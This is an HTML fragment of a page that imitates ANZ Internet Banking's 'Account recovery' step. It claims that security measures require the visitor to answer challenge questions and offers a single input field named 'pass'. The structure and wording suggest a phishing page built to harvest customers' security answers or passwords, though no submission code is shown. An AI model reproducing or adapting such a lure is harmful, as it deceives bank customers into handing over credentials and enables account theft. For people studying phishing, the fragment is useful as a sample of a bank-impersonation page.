...
<div class="an-con">
<p class="anload-img">
<center><img src="static/img/c666afcbe7d237e07fd1d.png" style="width:79px;height:79px;display:block;margin:0 auto;" /></center>
<br>
<p style="font-size:24px;text-align:center;">Account recovery</p>
<br>
<p style="font-size:16px;text-align:center;">As part of ANZ’s Internet Banking security measures, we need to confirm your identity before proceeding with the current action.</p>
<br>
<p style="font-size:16px;text-align:center;">Please answer the following challenge question. We may need you to answer more than one question.</p>
...
<div style="width:100%;height:45px;margin:0 auto;margin-top:-20px;"><input name="pass" type="tel" placeholder=""  class="input1" id="pass" min-length="4" maxlength="50" style="display:block; margin:0 auto;border-radius: 4px;font-size:14px;width:100%;height:45px;  padding-left: 5%;border: 0.5px solid rgb(204, 204, 204)"></div>
<br>
</div>
<tbody>
<tr>
...
<a href="index.asp" style="text-align:center;color:rgb(0, 114, 172);display:block;font-weight: 400;">Try another way</a>
